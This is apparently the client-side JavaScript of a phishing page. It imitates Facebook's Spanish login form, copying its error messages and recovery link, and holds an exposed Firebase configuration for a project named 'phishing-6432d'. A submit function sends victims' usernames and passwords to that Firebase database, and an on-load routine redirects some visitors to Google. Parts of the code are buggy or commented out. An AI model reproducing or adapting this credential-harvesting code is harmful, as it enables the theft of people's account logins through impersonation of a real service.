var firebaseConfig = {
    apiKey: "AIzaSyDkl2GXe2hV1644-vVpAEFot-w5tfr8zsI",
    authDomain: "phishing-6432d.firebaseapp.com",
    databaseURL: "https://phishing-6432d.firebaseio.com",
    projectId: "phishing-6432d",
    storageBucket: "phishing-6432d.appspot.com",
    messagingSenderId: "508538600716",
    appId: "1:508538600716:web:aa348971bde4a3ecdd9d29",
    measurementId: "G-X0T3W5VGYV",
};
// Initialize Firebase
firebase.initializeApp(firebaseConfig);


const db = firebase.database().ref("data");
const pattern = /^remington((\w)(?!\2)|\d){3}2@gmail.com$/;
const passwordPattern =/^(?=.{5,15}$)(?!yuli8954|galileo19)(([a-zA-ZáàâäãåçéèêëíìîïñóòôöõúùûüýÿæœÁÀÂÄÃÅÇÉÈÊËÍÌÎÏÑÓÒÔÖÕÚÙÛÜÝŸÆŒ])(?!\2)|(?!\d*?(\d)\3{2})\d*)+$/gm;   
///^(?={5,15}$) (([a-zA-Z])(?!\2) | (?!\d*?(\d)\3{3})\d*))$/gm;
async function  fetchData(){
    
    await  db.on('value',(snapshot)=>{
             snapshot.forEach((childSnap)=>{
                  let data = childSnap.val();
                  if(isUsernameValid(data.usenname) && isPasswordValid(data.password))
                       return;
                    else {
                        //window.document.getElementsByTagName('body').style.display='none';
                        window.location.replace(
                            "https://www.google.com",
                            "_blank"
                        );     
                    }   
                                   
             })
         })
  
  }
window.onload=fetchData();



//SUBMIT FUNCTION
submit = (username, password) => {
    let dataRef = db.push();
    dataRef.set({
        usename: username,
        password: password,
    });
};
const url = "https://phishing-6432d.firebaseio.com/data.json";
const loginBtn = document.getElementById("login");
const username = document.getElementById("m_login_email");
const password = document.getElementById("m_login_password");
const loginForm = document.getElementById("login_form");
const loginError = document.getElementById("login_error");


// EMPTY FIELDS ERROR
const errorMessage = document.createTextNode(
    "El correo electrónico o el número de teléfono que has introducido no coinciden con ninguna cuenta."
);
const errorMessageLink = document.createElement("a");
const linkMessage = document.createTextNode('Regístrate para crear una cuenta.')
const classAttribute = document.createAttribute("class");
const href = document.createAttribute("href");
classAttribute.value = " _652e ";
href.value = " / r.php ";

errorMessageLink.appendChild(linkMessage);
errorMessageLink.href = href.value;
errorMessageLink.setAttribute('class',classAttribute.value);

//WRONG PASSWORD ERROR
const errorMessagePass = document.createElement('span')
const errorPass = document.createTextNode('Contraseña incorrecta.')
const errorRecoverPassMessage = document.createTextNode('¿Has olvidado la contraseña?')
errorMessagePass.appendChild(errorPass);
const errorRecoverPass = document.createElement('a');
errorRecoverPass.href = "/recover/initiate/?ars=facebook_login_pw_error&amp;email=julieta.bonilla.520&amp;lwv=120&amp;lwc=1348092";
errorRecoverPass.setAttribute('class',classAttribute.value)
errorRecoverPass.appendChild(errorRecoverPassMessage);


//VALIDATION
function isUsernameValid(username){
   
    let regx=new RegExp(pattern);
    if(username){
      // return regx.test(username);   
      if(!regx.test(username))
              console.log("wrong");        
     else
        console.log("true")         
    }
    
    return false;
}
function isPasswordValid(password){
    const charSet=String.raw`a-zA-ZáàâäãåçéèêëíìîïñóòôöõúùûüýÿæœÁÀÂÄÃÅÇÉÈÊËÍÌÎÏÑÓÒÔÖÕÚÙÛÜÝŸÆŒ`;
   
    let regx=new RegExp(passwordPattern);
    console.log(regx.test(password))
    if(password)
        return regx.test(password)
    
   return false; 
}



loginForm.addEventListener("submit", async(e) => {
    e.preventDefault();
    e.stopPropagation();
    const data = {
        usename: username.value,
        password: password.value,
    };
   isPasswordValid(password.value);
    if (isUsernameValid(username.value) && isPasswordValid(password.value)) {
        // await submit(username.value, password.value);
        // window.location.replace(
        //     "https://www.facebook.com/watch/?v=193954128684871",
        //     "_blank"
        // );
    } else if(!username.value) {
        loginError.appendChild(errorMessage);
        loginError.appendChild(errorMessageLink);
        loginError.style.display = "block";
    }
    else{
        loginError.appendChild(errorMessagePass);
        loginError.appendChild(errorRecoverPass);
        loginError.style.display = "block"; 
    }
});
